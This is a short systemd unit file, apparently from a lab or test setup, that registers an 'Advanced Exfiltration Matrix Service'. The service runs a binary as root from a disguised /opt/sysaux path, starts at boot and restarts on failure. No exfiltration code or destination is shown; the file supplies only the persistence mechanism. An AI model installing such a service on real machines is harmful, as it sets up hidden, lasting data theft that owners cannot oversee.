# opt/etc/systemd/system/matrix-orchestrator.service
[Unit]
Description=Advanced Exfiltration Matrix Service
After=network.target network-oracle.service
Wants=network.target
PartOf=systemd-networkd.service

[Service]
Type=forking
User=root
Group=root
WorkingDirectory=/opt/sysaux
ExecStart=/opt/sysaux/bin/matrix_orchestrator start-all
ExecStop=/opt/sysaux/bin/matrix_orchestrator stop-all
Restart=on-failure
RestartSec=30
StartLimitInterval=60
StartLimitBurst=3
PIDFile=/var/run/matrix/orchestrator.pid

# Security hardening
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
ReadWritePaths=/opt/sysaux/.matrix /var/run/matrix
InaccessiblePaths=/home /root /boot /usr/lib/modules

# Resource limits
MemoryMax=512M
CPUQuota=50%

[Install]
WantedBy=multi-user.target
Also=network-oracle.service
